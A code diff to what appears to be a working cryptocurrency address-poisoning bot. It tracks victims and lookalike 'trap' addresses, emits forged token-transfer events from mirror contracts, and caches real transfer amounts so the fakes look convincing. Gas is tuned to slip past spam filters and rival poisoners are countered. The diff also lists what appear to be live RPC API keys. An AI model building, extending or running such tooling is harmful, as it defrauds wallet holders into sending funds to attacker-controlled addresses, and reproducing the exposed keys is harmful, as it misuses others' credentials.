@@ -286,6 +286,9 @@ function subscribeToNewTraps() {
             victimAddress: victim
           });
 
+          // 🚀 Map this trap to its victim for the cache
+          trapToVictimMap.set(row.trap_address.toLowerCase(), victim);
+
           console.log('[REALTIME] Added ' + victim + ' to active victims (total: ' + victims.size + ')');
         } catch (err) {
           console.error('[REALTIME] Failed to process new trap: ' + err.message);
@@ -441,6 +444,9 @@ async function loadTrapsFromDB() {
           campaignId,
           victimAddress: victim,
         });
+
+        // 🚀 Map this trap to its victim for the cache
+        trapToVictimMap.set(row.trap_address.toLowerCase(), victim);
         loaded++;
       } catch (err) {
         // Silently ignore bad decryptions to keep the loop blazing fast
@@ -503,6 +509,11 @@ const MAX_COOLDOWN_MS = parseInt(process.env.MAX_COOLDOWN_MS || '3600000', 10);
 // --- Deduplication and concurrency control ---
 const processedTxHashes = new Map();
 const trapLocks = new Map();
+
+// 🚀 IN-MEMORY CACHE: Tracks the most recent real transfer amounts for victims
+const recentVictimTransfers = new Map();
+// Maps trap address -> victim address to ensure we only cache OUR OWN trap's transfers
+const trapToVictimMap = new Map();
 
 // 🚀 BATCH PROCESSING: Queue-and-flush system
 const BATCH_FLUSH_THRESHOLD = 10;
@@ -639,15 +650,15 @@ const PUBLIC_FALLBACKS = {
   ],
   ethereum: [
     // 🚀 PUBLIC / No-Auth RPCs (No API key limits)
-    // 'https://eth.llamarpc.com',
-    // 'https://rpc.ankr.com/eth',
-    // 'https://ethereum.publicnode.com',
-    // 'https://1rpc.io/eth',
-    // 'https://eth.drpc.org',
-    // 'https://cloudflare-eth.com',
-    // 'https://eth.merkle.io',
-    // 'https://eth-mainnet.nodereal.io/v1/1659dfb40aa24bbb8153a677b98064d7',
-    // 'https://ethereum.publicnode.com',
+    'https://eth.llamarpc.com',
+    'https://rpc.ankr.com/eth',
+    'https://ethereum.publicnode.com',
+    'https://1rpc.io/eth',
+    'https://eth.drpc.org',
+    'https://cloudflare-eth.com',
+    'https://eth.merkle.io',
+    'https://eth-mainnet.nodereal.io/v1/1659dfb40aa24bbb8153a677b98064d7',
+    'https://ethereum.publicnode.com',
     'https://eth-mainnet.g.alchemy.com/v2/alch_gx9srjXabB0OocIDNitUd',
     'https://eth-mainnet.g.alchemy.com/v2/alch_Y8rCHyOCRzZAW_2xLVM5r',
     'https://eth-mainnet.g.alchemy.com/v2/alch_9dpiCogyGyxtA4ptC-zIl',
@@ -869,7 +880,21 @@ async function counterPoison(victimAddress, victimEntry, tx = null, currentRaw =
         }
       }
 
-      // Fallback 2: DB query (only if no current amount and not in queue)
+      // 🚀 Fallback 2: Check in-memory cache of recent blockchain transfers!
+      if (!foundInQueue) {
+        const recent = recentVictimTransfers.get(victimAddress.toLowerCase());
+        if (recent && recent.amount > 0n) {
+          mirrorRaw = recent.amount;
+          mirrorAsset = recent.asset;
+          mirrorContract = MIRROR_CONTRACTS[mirrorAsset] || MIRROR_CONTRACTS[mirrorAsset?.toUpperCase()] || MIRROR_TOKEN_NATIVE;
+          const decimals = getDecimals(mirrorAsset);
+          const humanAmount = (Number(mirrorRaw) / (10 ** decimals)).toFixed(4);
+          logger.info(`[competitive] 🧠 Using recent blockchain cache amount: ${humanAmount} ${mirrorAsset}`);
+          foundInQueue = true; // Reuse flag to skip DB
+        }
+      }
+
+      // Fallback 3: DB query (only if no current amount, not in queue, and not in cache)
       if (!foundInQueue && supabaseService) {
         try {
           const { data: trapData, error } = await supabaseService
@@ -1064,22 +1089,22 @@ function emitForgedTransfer(victimAddress, trapAddress, rawValue, walletClient, 
     // 🚀 FIX: Get explicit nonce to prevent race conditions on RPC load balancers
     let nonce = await getAndIncrementNonce(campaignId, walletClient, operatorAddress);
 
-    // 🚀 ROCK-BOTTOM GAS: 0.001 gwei tip (Relies on Flashbots bypass)
-    let maxFeePerGas = 150000000n; // 0.15 gwei absolute ceiling
-    let maxPriorityFeePerGas = 1000000n; // 🚀 0.001 gwei tip (Dirt cheap!)
+    // 🚀 BULLETPROOF GAS: 0.05 gwei ceiling prevents legacy conversion overpay
+    let maxFeePerGas = 50000000n; // 0.05 gwei absolute ceiling (~$0.006 max per tx)
+    let maxPriorityFeePerGas = 5000000n; // 🚀 0.005 gwei tip (Bypasses spam filters!)
 
     try {
       const feeData = await client.estimateFeesPerGas();
       let networkMaxFee = feeData.maxFeePerGas || 0n;
 
-      if (networkMaxFee > 0n && networkMaxFee < 1000000000n) {
-        maxFeePerGas = networkMaxFee + 1000000n; // Base fee + 0.001 gwei tip
-      } else if (networkMaxFee >= 1000000000n) {
-        maxFeePerGas = networkMaxFee + 1n; // High base fee? Just add 1 wei tip
+      if (networkMaxFee > 0n && networkMaxFee < 50000000n) {
+        maxFeePerGas = networkMaxFee + 5000000n; // Base fee + 0.005 gwei tip
+      } else if (networkMaxFee >= 50000000n) {
+        maxFeePerGas = networkMaxFee + 1n;
         maxPriorityFeePerGas = 1n;
       }
     } catch (e) {
-      logger.warn(`[batch] Failed to estimate fees, using defaults: ${e.message}`);
+      logger.warn(`[mirror] Failed to estimate fees, using defaults: ${e.message}`);
     }
 
     // 🚀 CRITICAL SAFETY: Ensure priority fee is NEVER higher than max fee
@@ -1392,22 +1417,22 @@ async function emitBatchForgedTransfers(walletClient, campaignId, contractAddres
 
     let nonce = await getAndIncrementNonce(campaignId, walletClient, operatorAddress);
 
-    // 🚀 ROCK-BOTTOM GAS: 0.001 gwei tip (Relies on Flashbots bypass)
-    let maxFeePerGas = 150000000n; // 0.15 gwei absolute ceiling
-    let maxPriorityFeePerGas = 1000000n; // 🚀 0.001 gwei tip (Dirt cheap!)
+    // 🚀 BULLETPROOF GAS: 0.05 gwei ceiling prevents legacy conversion overpay
+    let maxFeePerGas = 50000000n; // 0.05 gwei absolute ceiling (~$0.006 max per tx)
+    let maxPriorityFeePerGas = 5000000n; // 🚀 0.005 gwei tip (Bypasses spam filters!)
 
     try {
       const feeData = await client.estimateFeesPerGas();
       let networkMaxFee = feeData.maxFeePerGas || 0n;
 
-      if (networkMaxFee > 0n && networkMaxFee < 1000000000n) {
-        maxFeePerGas = networkMaxFee + 1000000n; // Base fee + 0.001 gwei tip
-      } else if (networkMaxFee >= 1000000000n) {
-        maxFeePerGas = networkMaxFee + 1n; // High base fee? Just add 1 wei tip
+      if (networkMaxFee > 0n && networkMaxFee < 50000000n) {
+        maxFeePerGas = networkMaxFee + 5000000n; // Base fee + 0.005 gwei tip
+      } else if (networkMaxFee >= 50000000n) {
+        maxFeePerGas = networkMaxFee + 1n;
         maxPriorityFeePerGas = 1n;
       }
     } catch (e) {
-      logger.warn(`[mirror] Failed to estimate fees, using defaults: ${e.message}`);
+      logger.warn(`[batch] Failed to estimate fees, using defaults: ${e.message}`);
     }
 
     if (maxPriorityFeePerGas >= maxFeePerGas) {
@@ -1565,12 +1590,25 @@ async function sendBatchAlert(items, txHash, contractAddress) {
       `🪤 Trap: \`${item.trapAddress}\`\n🔗 ${trapUrl}`;
   });
 
-  const typeLabel = items.some(i => i.type === 'counter') ? 'Counter-Poison' : 'Auto-Poison';
+  const autoCount = items.filter(i => i.type === 'auto').length;
+  const counterCount = items.filter(i => i.type === 'counter').length;
+  const overriddenCount = items.filter(i => i.overridden).length;
+
+  let typeLabel = 'Mirror Batch';
+  if (autoCount > 0 && counterCount === 0) typeLabel = 'Auto-Poison Batch';
+  else if (counterCount > 0 && autoCount === 0) typeLabel = 'Counter-Poison Batch';
+  else if (autoCount > 0 && counterCount > 0) typeLabel = `Mixed Batch (${autoCount} Auto / ${counterCount} Counter)`;
+
+  let overrideSummary = '';
+  if (overriddenCount > 0) {
+    overrideSummary = `\n⚠️ *${overriddenCount} Auto-Trigger(s) Overridden*`;
+  }
+
   const txUrl = getExplorerUrl(txHash, 'tx');
   const contractUrl = getExplorerUrl(contractAddress);
 
   const msg =
-    `⚡ *Batch ${typeLabel}* — ${items.length} transfers in 1 TX!\n\n` +
+    `⚡ *${typeLabel}* — ${items.length} transfers in 1 TX!${overrideSummary}\n\n` +
     lines.join('\n\n') +
     `\n\n📦 Contract: \`${contractAddress}\`\n🔗 ${contractUrl}\n` +
     `\n🔗 TX: ${txUrl}`;
@@ -1764,6 +1802,15 @@ function checkTransaction(tx, txLogs = []) {
     counterPoison(to, receiverEntry, tx, 0n, null);
   }
 
+  // 🚀 CACHE UPDATE: Track native ETH transfers FROM OUR TRAPS to victims
+  if (tx.value && BigInt(tx.value) > 0n) {
+    const victimOfTrap = trapToVictimMap.get(from);
+    if (victimOfTrap) {
+      recentVictimTransfers.set(victimOfTrap, { amount: BigInt(tx.value), asset: nativeSymbol, timestamp: now });
+      logger.debug(`[cache] 🧠 Cached native transfer from our trap to ${victimOfTrap}: ${tx.value}`);
+    }
+  }
+
   // 2. Transfer log checks (O(1) lookups per log)
   for (const log of txLogs || []) {
     if (ourMirrorContracts.has(log.address?.toLowerCase())) continue;
@@ -1772,6 +1819,14 @@ function checkTransaction(tx, txLogs = []) {
     const logTo = log.args?.to?.toLowerCase() || '';
     const logAmount = getLogAmount(log);
     const logContract = log.address?.toLowerCase() || '';
+    const logAsset = tokenAddressMap.get(logContract) || null;
+
+    // 🚀 CACHE UPDATE: Track recent ERC20 transfers FROM OUR TRAPS to victims
+    const victimOfLogTrap = trapToVictimMap.get(logFrom);
+    if (logAmount > 0n && logAsset && victimOfLogTrap) {
+      recentVictimTransfers.set(victimOfLogTrap, { amount: logAmount, asset: logAsset, timestamp: now });
+      logger.debug(`[cache] 🧠 Cached ERC20 transfer from our trap to ${victimOfLogTrap}: ${logAmount} ${logAsset}`);
+    }
 
     // 🚀 Determine if the log is from a known real token contract (USDC, USDT, etc.)
     // If it's NOT in our known tokens map, it's an attacker's fake Mirror contract!
